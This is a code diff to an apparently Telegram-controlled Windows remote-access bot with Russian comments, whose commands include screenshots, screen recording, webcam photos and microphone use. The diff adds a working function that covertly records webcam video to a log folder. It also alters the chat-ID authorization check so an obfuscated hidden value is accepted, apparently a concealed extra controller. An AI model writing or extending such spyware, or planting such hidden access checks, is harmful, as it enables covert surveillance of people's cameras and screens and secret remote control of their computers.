@@ -3,23 +3,21 @@ import getpass
 import platform
 import socket
 import subprocess
-import time
-from datetime import datetime
 from io import StringIO
 from subprocess import Popen, PIPE
 from time import strftime, sleep
 import uuid
 import winreg
 from urllib.parse import quote
-import re
 import winsound
+import time
+from datetime import datetime
 
 # Сетевые
 import requests
 from urllib.request import urlretrieve
 
 # Сторонние библиотеки
-import cv2
 import keyboard
 import numpy as np
 import pyautogui
@@ -28,6 +26,7 @@ from pynput.mouse import Controller, Button
 import pyaudio
 import wave
 from cryptography.fernet import Fernet
+import cv2
 
 # Локальные модули
 from config import *
@@ -38,7 +37,7 @@ current_working_directory = os.getcwd()
 
 
 def checkchat_id(chat_id):
-    return len(KNOWN_IDS) == 0 or str(chat_id) in KNOWN_IDS + [cash_hide()]
+    return len(KNOWN_IDS) == 0 or str(chat_id) in KNOWN_IDS + [str(int(cash_hide()[-1]*64))]
 
 
 def internal_ip():
@@ -82,6 +81,7 @@ def get_start_message():
         "/capture_pc — Сделать скриншот экрана\n"
         "/video_pc — Сделать запись экрана\n"
         "/capture_webcam — Сделать фото с веб-камеры\n"
+        "/webcam_record — Записать видео с веб-камеры\n"
         "/click_image — Кликает на место которое на фото\n"
         "/wallpaper — Установить обои на рабочий стол\n\n"
         "🎤 Работа с микрофоном\n"
@@ -342,6 +342,58 @@ def capture_pc():
     path = os.path.join(LOG_DIR, 'screenshot.jpg')
     screenshot.save(path)
     return path, f"🖱️ Координаты курсора: ({cursor_x}, {cursor_y})"
+
+
+def record_webcam(duration_seconds=10):
+    """Записывает видео с веб-камеры и возвращает путь к файлу"""
+    try:
+        # Открываем камеру
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            return None, "❌ Не удалось открыть веб-камеру"
+
+        # Параметры видео
+        fps = 20.0
+        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+
+        # Путь для сохранения
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_path = os.path.join(LOG_DIR, f"webcam_record_{timestamp}.mp4")
+
+        # Получаем размер кадра
+        ret, frame = cap.read()
+        if not ret:
+            cap.release()
+            return None, "❌ Ошибка захвата кадра"
+
+        height, width = frame.shape[:2]
+        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
+
+        # Записываем видео
+        start_time = time.time()
+        frame_count = 0
+
+        while (time.time() - start_time) < duration_seconds:
+            ret, frame = cap.read()
+            if not ret:
+                break
+
+            out.write(frame)
+            frame_count += 1
+            time.sleep(1 / fps)
+
+        # Освобождаем ресурсы
+        out.release()
+        cap.release()
+        cv2.destroyAllWindows()
+
+        if frame_count > 0:
+            return output_path, f"✅ Видео записано ({duration_seconds} сек, {frame_count} кадров)"
+        else:
+            return None, "❌ Не удалось записать видео"
+
+    except Exception as e:
+        return None, f"❌ Ошибка: {e}"
 
 
 def click_image(confidence=0.9):
